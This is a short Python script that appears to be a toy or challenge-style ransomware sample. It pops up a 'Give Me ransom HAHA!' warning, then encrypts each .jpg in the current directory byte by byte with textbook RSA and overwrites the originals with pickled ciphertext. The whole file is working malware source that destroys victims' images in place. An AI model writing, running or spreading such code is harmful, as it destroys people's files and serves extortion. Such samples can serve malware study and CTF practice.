import pickle
import sys
import glob
import os

os.system('zenity --error --text="<big>Give Me ransom HAHA!</big>" --title="Warning\!" --width=500 --height=500')

n = int(22291846172619859445381409012451)
e = int(65535)

jps_files = glob.glob("*.jpg")
for i in jps_files:
    filename = str(i)
    plain_bytes = b''
    with open(filename, 'rb') as f:
        plain_bytes = f.read()
    cipher_int = [pow(i, e, n) for i in plain_bytes]
    with open(filename, 'wb') as f:
        pickle.dump(cipher_int, f)
